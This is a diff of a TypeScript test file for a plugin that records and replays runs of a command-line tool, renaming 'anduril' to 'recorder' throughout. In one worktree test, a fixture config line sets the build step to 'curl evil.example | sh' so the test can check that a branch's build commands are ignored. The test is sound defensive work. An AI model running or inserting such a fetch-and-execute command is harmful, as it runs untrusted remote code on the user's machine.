@@ -1,7 +1,7 @@
 import { describe, expect, mock, test } from 'claude-code/testing'
 import type { TestBody } from 'claude-code/testing'
 
-import type { AndurilDiff, AndurilRun } from '../types'
+import type { RunsDiff, RecordedRun } from '../types'
 import { commandLine, corpusOf, diffText, ending, ends, excerpt, launcher, names, parseDiff, parseProject, parseRun, parseTargets, prelude, remarks, runText, withKept } from '../hooks/record'
 
 type Engine = Parameters<TestBody>[0]
@@ -15,7 +15,7 @@ const BINARY = `${CWD}/narsil/target/debug/narsil`
 const plain = (path: string) => path.replace(/\\/g, '/').replace(/^[A-Za-z]:/, '')
 const whole = plain
 
-const run = (given: Partial<AndurilRun> & { id: string }): AndurilRun => ({
+const run = (given: Partial<RecordedRun> & { id: string }): RecordedRun => ({
   label: 'narsil',
   argv: ['ls'],
   cwd: `${CWD}/narsil`,
@@ -125,7 +125,7 @@ const machine = (on: On, given: Record<string, string> = {}) => {
   on('process.run', (_, e) => {
     const argv = e.argv
     const given = e as unknown as { stdin?: string; init?: { stdin?: string } }
-    const isReplay = argv.some(arg => arg.endsWith('anduril_replay.py'))
+    const isReplay = argv.some(arg => arg.endsWith('recorder_replay.py'))
 
     if (isReplay) replay.jobs.push(JSON.parse(given.stdin ?? given.init?.stdin ?? '{}') as Record<string, unknown>)
     else ran.push(argv.join(' '))
@@ -138,21 +138,21 @@ const machine = (on: On, given: Record<string, string> = {}) => {
     ran,
     written,
     replay,
-    record: (one: AndurilRun) => {
-      files[`${CWD}/.anduril/runs/${one.id}.json`] = JSON.stringify(one)
+    record: (one: RecordedRun) => {
+      files[`${CWD}/.recorder/runs/${one.id}.json`] = JSON.stringify(one)
     },
   }
 }
 
-const watching = (on: On, records: AndurilRun[] = []) => {
-  const world = machine(on, { [`${CWD}/.claude/anduril`]: WATCHED, [BINARY]: 'ELF' })
+const watching = (on: On, records: RecordedRun[] = []) => {
+  const world = machine(on, { [`${CWD}/.claude/recorder`]: WATCHED, [BINARY]: 'ELF' })
   for (const one of records) world.record(one)
 
   return world
 }
 
 const mountPane = ($: Engine, surface: 'terminal' | 'desktop' = 'terminal', bodyColumns = 100) =>
-  $.ui.mount({ plugin: 'anduril', surface, component: 'Pane', props: { bodyColumns } as never, requestId: 'anduril' })
+  $.ui.mount({ plugin: 'recorder', surface, component: 'Pane', props: { bodyColumns } as never, requestId: 'recorder' })
 
 // The facts a system prompt is composed from, as far as a test names them
 const FACTS = { model: 'claude-test', promptModel: 'claude-test', surfaces: [], tools: [], outputStyle: null, traits: [] } as never
@@ -179,10 +179,10 @@ describe('what is watched', () => {
 
   test('writes a launcher that hands the run to the shim with every argument as given', () => {
     const [target] = parseTargets(WATCHED, CWD)
-    const text = launcher({ shim: "/mods/it's here/shim/anduril_shim.py", cwd: CWD, target: target! })
+    const text = launcher({ shim: "/mods/it's here/shim/recorder_shim.py", cwd: CWD, target: target! })
 
     expect(text.startsWith('#!/bin/sh\n')).toBe(true)
-    expect(text).toContain(`exec python3 '/mods/it'\\''s here/shim/anduril_shim.py' --dir '/proj/.anduril' --label 'narsil' --binary '${BINARY}' -- "$@"`)
+    expect(text).toContain(`exec python3 '/mods/it'\\''s here/shim/recorder_shim.py' --dir '/proj/.recorder' --label 'narsil' --binary '${BINARY}' -- "$@"`)
   })
 })
 
@@ -202,7 +202,7 @@ describe('the runs a project keeps', () => {
   })
 
   test('says a comparison by the runs that changed, how each did, and the ones that did not', () => {
-    const said = diffText(parseDiff(JSON.stringify(ANSWER), 0) as AndurilDiff)
+    const said = diffText(parseDiff(JSON.stringify(ANSWER), 0) as RunsDiff)
 
     expect(said).toMatch(/^narsil, the working tree against HEAD \(223f934\): 2 of 3 kept runs changed\./)
     expect(said).toContain('changed: narsil show 999\n  exit 1 → 2\n  --- from/stderr')
@@ -211,7 +211,7 @@ describe('the runs a project keeps', () => {
   })
 
   test('says what a run did to files that the builds do not agree on: left, written outside, or written and removed', () => {
-    const made = parseDiff(JSON.stringify(ANSWER), 0) as AndurilDiff
+    const made = parseDiff(JSON.stringify(ANSWER), 0) as RunsDiff
     const said = diffText(made)
 
     expect(said).toContain('changed: narsil seal chronicle.jsonl\n  file root/chronicle.jsonl.seal: not the same\n  file root/extra.bin: the working tree alone left it\n  written outside the folder: HEAD (223f934) nothing; the working tree /tmp/outside.txt')
@@ -225,7 +225,7 @@ describe('the runs a project keeps', () => {
 
   test('says why a build was not played in place of what changed', () => {
     const broken = { ...ANSWER, cases: [], to: { ref: 'work', sha: '', error: 'it does not build (cargo build, exit 101):\nerror[E0425]: cannot find value' } }
-    const said = diffText(parseDiff(JSON.stringify(broken), 0) as AndurilDiff)
+    const said = diffText(parseDiff(JSON.stringify(broken), 0) as RunsDiff)
 
     expect(said).toMatch(/^narsil, the working tree against HEAD \(223f934\): not compared\./)
     expect(said).toContain('the working tree was not played: it does not build')
@@ -282,14 +282,14 @@ describe('a stream too long to show whole', () => {
   })
 })
 
-describe('anduril', () => {
+describe('recorder', () => {
   for (const surface of ['terminal', 'desktop'] as const) {
     test(`says how to have a tool watched where none is, on ${surface}`, async ($, on) => {
       machine(on)
       const pane = await mountPane($, surface)
 
       expect(await pane.find({ text: /no tool watched/ })).toBeDefined()
-      expect(await pane.find({ text: /Name one in \.claude\/anduril/ })).toBeDefined()
+      expect(await pane.find({ text: /Name one in \.claude\/recorder/ })).toBeDefined()
     })
 
     test(`lists the runs newest first, and opens one on what it wrote to each stream, on ${surface}`, async ($, on) => {
@@ -299,19 +299,19 @@ describe('anduril', () => {
 
       expect(await pane.find({ text: /3 runs · 2 failed/ })).toBeDefined()
 
-      const drawn = await call($, 'mcp__anduril__pane')
+      const drawn = await call($, 'mcp__recorder__pane')
       expect(drawn.indexOf('show 1')).toBeLessThan(drawn.indexOf('show 999'))
       expect(drawn.indexOf('show 999')).toBeLessThan(drawn.indexOf('ls --format json'))
       expect(drawn).toMatch(/claude\s+0\s+5\.2 ms\s+\[narsil ls --format json\]/)
       expect(drawn).toMatch(/you\s+101 panic/)
 
       await pane.press({ key: 'run-2000-2' })
-      const opened = await call($, 'mcp__anduril__pane')
+      const opened = await call($, 'mcp__recorder__pane')
       expect(opened).toContain('stdout: nothing')
       expect(opened).toMatch(/stderr 41 B\n\s+narsil: no lighting 999 in the chronicle/)
 
       await pane.press({ key: 'failed-only' })
-      expect(await call($, 'mcp__anduril__pane')).not.toContain('ls --format json')
+      expect(await call($, 'mcp__recorder__pane')).not.toContain('ls --format json')
     })
   }
 
@@ -320,13 +320,13 @@ describe('anduril', () => {
     const pane = await mountPane($, 'terminal', 50)
     await pane.press({ key: 'refresh' })
 
-    const drawn = await call($, 'mcp__anduril__pane')
+    const drawn = await call($, 'mcp__recorder__pane')
     expect(drawn).toMatch(/AT\s+EXIT\s+COMMAND/)
     expect(drawn).not.toMatch(/\bBY\b|\bTOOK\b/)
     expect(drawn).toMatch(/\s0\s+\[narsil ls --format json\]/)
 
     await pane.press({ key: 'run-2000-2' })
-    expect(await call($, 'mcp__anduril__pane')).toMatch(/exit 1 · by you at \d\d:\d\d:\d\d · /)
+    expect(await call($, 'mcp__recorder__pane')).toMatch(/exit 1 · by you at \d\d:\d\d:\d\d · /)
   })
 
   test('puts a launcher in place for each tool, once, and says when a tool is not built', async ($, on) => {
@@ -335,9 +335,9 @@ describe('anduril', () => {
     const pane = await mountPane($)
     await pane.press({ key: 'refresh' })
 
-    expect(world.files[`${CWD}/.anduril/bin/narsil`]).toContain(`--binary '${BINARY}' -- "$@"`)
-    expect(world.files[`${CWD}/.anduril/.gitignore`]).toBe('*\n')
-    expect(world.ran).toEqual([`chmod +x ${CWD}/.anduril/bin/narsil`])
+    expect(world.files[`${CWD}/.recorder/bin/narsil`]).toContain(`--binary '${BINARY}' -- "$@"`)
+    expect(world.files[`${CWD}/.recorder/.gitignore`]).toBe('*\n')
+    expect(world.ran).toEqual([`chmod +x ${CWD}/.recorder/bin/narsil`])
     expect(await pane.find({ text: /narsil is not built/ })).toBeDefined()
 
     world.files[BINARY] = 'ELF'
@@ -364,7 +364,7 @@ describe('anduril', () => {
     await $.tool.call({ tool: 'Bash', command: 'narsil show 999' } as never)
 
     expect(commands).toEqual(['git status', `${prelude(CWD)}narsil show 999`])
-    expect(commands[1]).toBe(`export PATH='/proj/.anduril/bin':"$PATH" ANDURIL_BY=claude\nnarsil show 999`)
+    expect(commands[1]).toBe(`export PATH='/proj/.recorder/bin':"$PATH" RECORDER_BY=claude\nnarsil show 999`)
     // And the pane has it without being asked
     expect(await pane.find({ text: /1 run · 1 failed/ })).toBeDefined()
   })
@@ -377,29 +377,29 @@ describe('anduril', () => {
     // Written after the last look, and longer than the session holds of a stream
     world.record({ ...PANICKED, stdout: 'x'.repeat(9000), stdoutBytes: 9000 })
 
-    const listed = await call($, 'mcp__anduril__runs')
+    const listed = await call($, 'mcp__recorder__runs')
     expect(listed).toMatch(/^3 of 3 recorded runs/)
     expect(listed).toContain("3000-3  ")
     expect(listed).toMatch(/1000-1 .* claude {2}exit 0 {2}5\.2 ms {2}narsil ls --format json/)
 
-    const failed = await call($, 'mcp__anduril__runs', { failed: true, grep: '999' })
+    const failed = await call($, 'mcp__recorder__runs', { failed: true, grep: '999' })
     expect(failed).toMatch(/^1 of 3 recorded runs/)
     expect(failed).toContain('exit 1')
 
-    const last = await call($, 'mcp__anduril__run', { max: 60_000 })
+    const last = await call($, 'mcp__recorder__run', { max: 60_000 })
     expect(last).toContain("Run 3000-3: narsil --chronicle 'an empty.jsonl' show 1")
     expect(last).toContain('exit 101 panic after')
     expect(last).toContain('x'.repeat(9000))
     expect(last).toContain('index out of bounds')
 
-    expect(await call($, 'mcp__anduril__run', { id: '2000-2' })).toContain('stderr (41 B):\nnarsil: no lighting 999 in the chronicle')
-    expect(await call($, 'mcp__anduril__run', { id: 'nope' })).toMatch(/No run nope is recorded/)
+    expect(await call($, 'mcp__recorder__run', { id: '2000-2' })).toContain('stderr (41 B):\nnarsil: no lighting 999 in the chronicle')
+    expect(await call($, 'mcp__recorder__run', { id: 'nope' })).toMatch(/No run nope is recorded/)
   })
 
   test('says how to have a tool watched to a Claude that asks where none is', async ($, on) => {
     machine(on)
 
-    expect(await call($, 'mcp__anduril__runs')).toMatch(/anduril watches no tool here/)
+    expect(await call($, 'mcp__recorder__runs')).toMatch(/recorder watches no tool here/)
   })
 
   test('tells Claude to run a watched tool by its name, and says nothing where none is watched', async ($, on) => {
@@ -412,16 +412,16 @@ describe('anduril', () => {
     await pane.press({ key: 'refresh' })
     const { sections } = await $.prompt.compose(FACTS)
 
-    expect(sections.map(({ id }) => id)).toEqual(['intro', 'anduril:watch'])
+    expect(sections.map(({ id }) => id)).toEqual(['intro', 'recorder:watch'])
     expect(sections[1]?.text).toContain('run it by its name (`narsil --help`)')
     expect(sections[1]?.text).toContain(`narsil: ${BINARY}`)
   })
 
   test('plays the kept runs on the working tree and on HEAD when Claude asks what changed, or on the commits it names', async ($, on) => {
-    const world = machine(on, { [`${CWD}/.claude/anduril`]: KEPT, [BINARY]: 'ELF' })
+    const world = machine(on, { [`${CWD}/.claude/recorder`]: KEPT, [BINARY]: 'ELF' })
     world.replay.answer = JSON.stringify(ANSWER)
 
-    const said = await call($, 'mcp__anduril__diff')
+    const said = await call($, 'mcp__recorder__diff')
 
     expect(said).toMatch(/2 of 3 kept runs changed/)
     expect(said).toContain('exit 1 → 2')
@@ -438,15 +438,15 @@ describe('anduril', () => {
       mergeBase: false,
     })
 
-    await call($, 'mcp__anduril__diff', { from: 'main', to: 'narsil/v0.2.0', mergeBase: true })
+    await call($, 'mcp__recorder__diff', { from: 'main', to: 'narsil/v0.2.0', mergeBase: true })
     expect(world.replay.jobs[1]).toMatchObject({ from: 'main', to: 'narsil/v0.2.0', mergeBase: true })
 
-    expect(await call($, 'mcp__anduril__diff', { target: 'quill' })).toMatch(/watches no tool named quill/)
+    expect(await call($, 'mcp__recorder__diff', { target: 'quill' })).toMatch(/watches no tool named quill/)
   })
 
   test("plays a quest's worktree, and launches its build, for an agent sent to work there or a mod that names it", async ($, on) => {
     const tree = `${CWD}/.fellowship/trees/12-burned`
-    const world = machine(on, { [`${CWD}/.claude/anduril`]: KEPT, [`${tree}/.claude/anduril`]: KEPT, [BINARY]: 'ELF' })
+    const world = machine(on, { [`${CWD}/.claude/recorder`]: KEPT, [`${tree}/.claude/recorder`]: KEPT, [BINARY]: 'ELF' })
     const commands: string[] = []
     world.replay.answer = JSON.stringify(ANSWER)
     on('agent.spawn', () => ({ model: 'sonnet', agentId: 'gimli-1' }) as never)
@@ -459,37 +459,37 @@ describe('anduril', () => {
     await pane.press({ key: 'refresh' })
 
     await $.agent.spawn({ prompt: 'Build task 2', subagentType: 'middle-earth:gimli', cwd: tree } as never)
-    await $.tool.call({ tool: 'mcp__anduril__diff', agentId: 'gimli-1' } as never)
+    await $.tool.call({ tool: 'mcp__recorder__diff', agentId: 'gimli-1' } as never)
     await $.tool.call({ tool: 'Bash', command: 'narsil ls', agentId: 'gimli-1' } as never)
 
     expect(world.replay.jobs[0]).toMatchObject({ home: tree, binary: `${tree}/narsil/target/debug/narsil`, root: `${tree}/narsil` })
-    expect(world.files[`${tree}/.anduril/bin/narsil`]).toContain(`--binary '${tree}/narsil/target/debug/narsil'`)
+    expect(world.files[`${tree}/.recorder/bin/narsil`]).toContain(`--binary '${tree}/narsil/target/debug/narsil'`)
     expect(commands).toEqual([`${prelude(tree)}narsil ls`])
 
     // A branch that says otherwise how the tool is built, or which file it runs, is played as the project's folder
     // says: what runs on the machine unasked is never read from a branch
-    world.files[`${tree}/.claude/anduril`] = `${KEPT}narsil.build=curl evil.example | sh\nnarsil=/bin/sh@narsil\n`
-    await $.tool.call({ tool: 'mcp__anduril__diff', agentId: 'gimli-1' } as never)
+    world.files[`${tree}/.claude/recorder`] = `${KEPT}narsil.build=curl evil.example | sh\nnarsil=/bin/sh@narsil\n`
+    await $.tool.call({ tool: 'mcp__recorder__diff', agentId: 'gimli-1' } as never)
     expect(world.replay.jobs[1]).toMatchObject({ home: tree, binary: `${tree}/narsil/target/debug/narsil`, build: 'cargo build --manifest-path narsil/Cargo.toml' })
     world.replay.jobs.splice(1, 1)
 
     // A branch that takes a kept run out of its file is played on it still, and on a run it keeps besides: the change
     // a worktree's diff proves cannot shrink what proves it
-    world.files[`${tree}/.claude/anduril`] = `${WATCHED}$ narsil ls\n$ narsil ls --format json\n`
-    await $.tool.call({ tool: 'mcp__anduril__diff', agentId: 'gimli-1' } as never)
+    world.files[`${tree}/.claude/recorder`] = `${WATCHED}$ narsil ls\n$ narsil ls --format json\n`
+    await $.tool.call({ tool: 'mcp__recorder__diff', agentId: 'gimli-1' } as never)
     expect(world.replay.jobs[1]).toMatchObject({ corpus: ['narsil show 999', 'narsil ls', 'narsil ls --format json'] })
     world.replay.jobs.splice(1, 1)
 
     // A mod names the worktree outright; a folder that is no quest's is never played
-    await call($, 'mcp__anduril__diff', { tree })
-    await call($, 'mcp__anduril__diff', { tree: '/etc' })
+    await call($, 'mcp__recorder__diff', { tree })
+    await call($, 'mcp__recorder__diff', { tree: '/etc' })
     expect(world.replay.jobs.map(job => job.home)).toEqual([tree, tree, CWD])
   })
 
   test('says how to keep a run where none is kept, and plays nothing', async ($, on) => {
     const world = watching(on)
 
-    expect(await call($, 'mcp__anduril__diff')).toMatch(/No run of narsil is kept to play.*\$ narsil --help/)
+    expect(await call($, 'mcp__recorder__diff')).toMatch(/No run of narsil is kept to play.*\$ narsil --help/)
     expect(world.replay.jobs).toHaveLength(0)
   })
 
@@ -505,13 +505,13 @@ describe('anduril', () => {
       await pane.press({ key: 'run-2000-2' })
       await pane.press({ key: 'keep' })
 
-      expect(world.files[`${CWD}/.claude/anduril`]).toBe(`${WATCHED}$ narsil show 999\n`)
+      expect(world.files[`${CWD}/.claude/recorder`]).toBe(`${WATCHED}$ narsil show 999\n`)
       expect(await pane.find({ text: /1 kept run/ })).toBeDefined()
 
       await pane.press({ key: 'diff' })
 
       expect(world.replay.jobs[0]).toMatchObject({ corpus: ['narsil show 999'], from: 'HEAD', to: 'work' })
-      const drawn = await call($, 'mcp__anduril__pane')
+      const drawn = await call($, 'mcp__recorder__pane')
       expect(drawn).toMatch(/narsil, the working tree against HEAD \(223f934\): 2 of 2 kept runs changed/)
       expect(drawn).toMatch(/narsil show 999 exit 1 → 2/)
       expect(drawn).toContain('+narsil: lighting 999 is not in the chronicle')
@@ -520,7 +520,7 @@ describe('anduril', () => {
       expect(drawn).toContain('Written outside the folder the runs were played in, so on this machine: /tmp/outside.txt')
 
       await pane.press({ key: 'diff-hide' })
-      expect(await call($, 'mcp__anduril__pane')).not.toContain('kept runs changed')
+      expect(await call($, 'mcp__recorder__pane')).not.toContain('kept runs changed')
     })
   }
 })
